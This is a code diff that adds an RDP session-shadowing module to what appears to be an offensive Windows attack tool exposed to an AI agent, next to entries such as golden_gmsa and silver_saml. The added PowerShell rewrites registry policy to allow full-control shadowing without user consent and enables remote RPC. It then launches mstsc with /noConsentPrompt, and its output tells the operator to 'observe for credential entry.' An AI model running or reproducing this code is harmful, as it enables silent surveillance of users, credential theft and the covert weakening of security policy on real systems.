@@ -21820,6 +21820,210 @@ try {
   return { output: output.join("\n"), findings }
 }
 
+async function rdpShadow(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "enum"
+  const sessionId = argVal(args, "--session-id")
+  const noConsent = hasFlag(args, "--no-consent")
+  const control = hasFlag(args, "--control")
+  const findings: Finding[] = []
+  const output: string[] = ["[*] RDP session shadowing operations...\n"]
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== Active RDP Sessions ==="
+Write-Output ""
+
+# query user shows all sessions
+$sessions = query user 2>&1
+Write-Output $sessions
+Write-Output ""
+
+# Parse session details
+$activeCount = 0
+$lines = $sessions -split "`n" | Select-Object -Skip 1
+foreach ($line in $lines) {
+  if ($line -match '^\s*(\S+)\s+(\S+)\s+(\d+)\s+(Active|Disc)\s') {
+    $user = $Matches[1]
+    $sess = $Matches[2]
+    $id = $Matches[3]
+    $state = $Matches[4]
+    if ($state -eq 'Active') { $activeCount++ }
+  }
+}
+Write-Output "ACTIVE_COUNT=$activeCount"
+
+# Check shadow permissions
+Write-Output ""
+Write-Output "=== Shadow Configuration ==="
+
+# GPO: AllowRemoteRPC
+$rpc = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' -Name AllowRemoteRPC -ErrorAction SilentlyContinue).AllowRemoteRPC
+Write-Output "AllowRemoteRPC: $(if ($rpc -eq 1) { 'ENABLED (remote shadow possible)' } else { 'DISABLED (local shadow only)' })"
+Write-Output "REMOTE_RPC=$rpc"
+
+# Shadow mode policy
+$shadow = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name Shadow -ErrorAction SilentlyContinue).Shadow
+$shadowModes = @{
+  0 = 'Disabled'
+  1 = 'Full Control with user permission'
+  2 = 'Full Control without user permission'
+  3 = 'View Only with user permission'
+  4 = 'View Only without user permission'
+}
+$shadowMode = if ($shadow -ne $null) { $shadowModes[$shadow] } else { 'Not configured (default: Full Control with permission)' }
+Write-Output "Shadow Policy: $shadowMode"
+Write-Output "SHADOW_MODE=$shadow"
+
+# Check if current user can shadow
+Write-Output ""
+Write-Output "=== Current User Privileges ==="
+$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+Write-Output "Is Admin: $isAdmin"
+
+$groups = whoami /groups /fo csv 2>&1 | ConvertFrom-Csv
+$rdpUsers = $groups | Where-Object { $_.'Group Name' -match 'Remote Desktop Users' }
+Write-Output "Remote Desktop Users: $(if ($rdpUsers) { 'YES' } else { 'NO' })"
+Write-Output "CAN_SHADOW=$(if ($isAdmin) { '1' } else { '0' })"
+
+# NLA (Network Level Authentication) status
+$nla = (Get-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -Name UserAuthentication -ErrorAction SilentlyContinue).UserAuthentication
+Write-Output ""
+Write-Output "NLA Required: $(if ($nla -eq 1) { 'YES' } else { 'NO' })"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    const activeCount = r.stdout.match(/ACTIVE_COUNT=(\d+)/)
+    const shadowMode = r.stdout.match(/SHADOW_MODE=(\d*)/)
+    const canShadow = r.stdout.includes("CAN_SHADOW=1")
+
+    if (activeCount && parseInt(activeCount[1]) > 0 && canShadow) {
+      findings.push({
+        checkId: "WIN-RDP-001",
+        provider: "windows",
+        severity: "high",
+        status: "SHADOWABLE",
+        resource: "rdp://sessions",
+        title: `${activeCount[1]} active RDP sessions available for shadowing`,
+        details: `Active sessions can be shadowed for real-time credential observation. Shadow mode: ${shadowMode ? shadowMode[1] : "default"}. Use --action shadow --session-id ID to start.`,
+        remediation: "Set GPO 'Set rules for remote control of RDS sessions' to Disabled.",
+      })
+    }
+
+    if (shadowMode && (shadowMode[1] === "2" || shadowMode[1] === "4")) {
+      findings.push({
+        checkId: "WIN-RDP-002",
+        provider: "windows",
+        severity: "critical",
+        status: "NO_CONSENT",
+        resource: "rdp://shadow-policy",
+        title: "RDP shadow allowed WITHOUT user consent",
+        details: "Shadow policy permits shadowing active sessions without the user seeing a consent prompt. This enables completely silent session observation.",
+        remediation: "Set shadow policy to require user permission (mode 1 or 3).",
+      })
+    }
+  }
+
+  if (action === "shadow") {
+    if (!sessionId) {
+      output.push("ERROR: --session-id required (use --action enum to list sessions)")
+      return { output: output.join("\n"), findings }
+    }
+
+    const shadowFlag = control ? "/control" : ""
+    const consentFlag = noConsent ? "/noConsentPrompt" : ""
+
+    const script = `
+Write-Output "=== Starting RDP Shadow ==="
+Write-Output "Session ID: ${sessionId}"
+Write-Output "Mode: $(if ('${control}' -eq 'true') { 'Full Control (interactive)' } else { 'View Only (passive)' })"
+Write-Output "Consent: $(if ('${noConsent}' -eq 'true') { 'DISABLED (silent)' } else { 'User will see consent prompt' })"
+Write-Output ""
+
+# Verify session exists and is active
+$session = query session ${sessionId} 2>&1
+Write-Output $session
+Write-Output ""
+
+# Check shadow policy allows no-consent if requested
+${noConsent ? `
+$shadowPolicy = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name Shadow -ErrorAction SilentlyContinue).Shadow
+if ($shadowPolicy -ne 2 -and $shadowPolicy -ne 4) {
+  Write-Output "[!] WARNING: Shadow policy may require user consent"
+  Write-Output "    Set registry to allow no-consent shadow:"
+  Write-Output "    reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' /v Shadow /t REG_DWORD /d 2 /f"
+  Write-Output ""
+}
+` : ""}
+
+# Configure shadow settings for no-consent if needed
+${noConsent ? `
+Write-Output "[*] Configuring no-consent shadow..."
+Set-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name Shadow -Value 2 -Type DWord -Force -ErrorAction SilentlyContinue
+Write-Output "[+] Shadow policy set to: Full Control without consent"
+Write-Output "POLICY_SET=1"
+Write-Output ""
+` : ""}
+
+# Start shadow session
+Write-Output "[*] Launching shadow session..."
+Write-Output "[*] Command: mstsc /shadow:${sessionId} ${shadowFlag} ${consentFlag}"
+Write-Output ""
+Write-Output "[*] Press Ctrl+* to disconnect from shadow session"
+Write-Output ""
+
+# Start mstsc shadow in background
+Start-Process mstsc -ArgumentList "/shadow:${sessionId} ${shadowFlag} ${consentFlag}" -WindowStyle Normal
+Write-Output "[+] Shadow session launched"
+Write-Output "SHADOW_STATUS=STARTED"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+
+    if (r.stdout.includes("SHADOW_STATUS=STARTED")) {
+      findings.push({
+        checkId: "WIN-RDP-010",
+        provider: "windows",
+        severity: "critical",
+        status: "SHADOWING",
+        resource: `rdp://session/${sessionId}`,
+        title: `RDP session ${sessionId} is being shadowed`,
+        details: `${control ? "Full control" : "View only"} shadow active. ${noConsent ? "No user consent prompt." : "User may see consent dialog."} Observe for credential entry.`,
+        remediation: "Disconnect shadow with Ctrl+*. Restore policy if modified.",
+      })
+    }
+  }
+
+  if (action === "config") {
+    const script = `
+Write-Output "=== RDP Shadow Configuration ==="
+Write-Output ""
+
+# Enable remote shadow (AllowRemoteRPC)
+Write-Output "[*] Enabling remote shadow capability..."
+Set-ItemProperty 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' -Name AllowRemoteRPC -Value 1 -Type DWord -Force
+Write-Output "[+] AllowRemoteRPC = 1 (remote shadow enabled)"
+
+# Set shadow policy to no-consent
+Write-Output "[*] Setting shadow policy to no-consent..."
+Set-ItemProperty 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' -Name Shadow -Value 2 -Type DWord -Force
+Write-Output "[+] Shadow = 2 (Full Control without user permission)"
+
+Write-Output ""
+Write-Output "[+] Configuration complete"
+Write-Output "[*] Now use: winhook rdp_shadow --action shadow --session-id ID --control --no-consent"
+Write-Output ""
+Write-Output "[!] Cleanup: Restore shadow policy"
+Write-Output "    reg delete 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services' /v Shadow /f"
+Write-Output "    reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server' /v AllowRemoteRPC /t REG_DWORD /d 0 /f"
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 // ── Dispatch ──
 
 async function privilegeAbuse(args: string[], timeout: number): Promise<HookResult> {
@@ -25454,6 +25658,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   wsus_abuse: wsusAbuse,
   golden_gmsa: goldenGmsa,
   silver_saml: silverSaml,
+  rdp_shadow: rdpShadow,
 }
 
 export const WinhookTool = Tool.define("winhook", {
